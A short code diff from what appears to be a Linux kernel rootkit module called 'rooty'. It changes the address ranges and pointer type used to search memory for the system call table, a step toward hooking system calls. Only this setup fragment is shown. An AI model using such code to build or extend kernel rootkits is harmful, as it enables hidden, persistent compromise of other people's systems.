@@ -10,15 +10,9 @@ module_exit(rooty_exit);
 
 /* find sys_call_table */
 
-#if defined(__i386__)
-#define START_CHECK 0xc0000000
-#define END_CHECK 0xd0000000
+
 typedef unsigned int psize;
-#else
-#define START_CHECK 0xffffffff81000000
-#define END_CHECK 0xffffffffa2000000
-typedef unsigned long psize;
-#endif
+
 
 psize *sys_call_table;
 psize **find(void) {
